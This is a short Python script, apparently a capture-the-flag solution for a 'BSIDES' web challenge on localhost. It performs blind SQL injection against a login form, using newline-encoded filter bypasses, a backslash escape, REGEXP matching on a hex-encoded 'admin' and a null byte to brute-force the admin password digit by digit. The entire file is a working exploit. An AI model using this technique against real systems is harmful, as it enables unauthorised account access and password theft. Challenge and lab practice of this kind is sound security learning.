import requests

url = "http://localhost/BSIDES/chal/?user=\&pw=%0a||%0a(user%0aregexp%0a0x61646d696e%0a%26%26%0a"

len = 8
password = ''
chq = "Welcome admin"

for i in range(len):
	for j in range(10):
		query = url + 'pw%0aregexp%0a"^' + password + str(j) + '");%00'
		print query
		req = requests.get(query)
		res = req.text
		if(chq in res):
			password = password + str(j)
			break
	
print password
